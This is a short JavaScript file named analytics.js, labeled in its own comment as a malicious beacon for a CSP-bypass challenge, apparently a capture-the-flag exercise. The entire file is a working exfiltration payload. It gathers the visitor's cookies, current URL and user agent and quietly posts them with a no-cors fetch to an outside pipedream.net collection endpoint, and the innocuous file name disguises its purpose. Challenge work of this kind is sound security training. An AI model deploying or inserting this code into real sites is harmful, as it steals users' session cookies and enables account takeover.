// analytics.js  – malicious beacon for CSP-bypass challenge
(() => {
  const payload = {
    cookie: document.cookie,   // the juicy stuff (flag lives here)
    url:    location.href,     // page the victim is on
    ua:     navigator.userAgent,
    ts:     Date.now()
  };

  // Fire-and-forget POST; no-cors keeps errors quiet
  fetch('https://eok9itjcz7vwbnr.m.pipedream.net', {
    method: 'POST',
    mode:   'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
})();
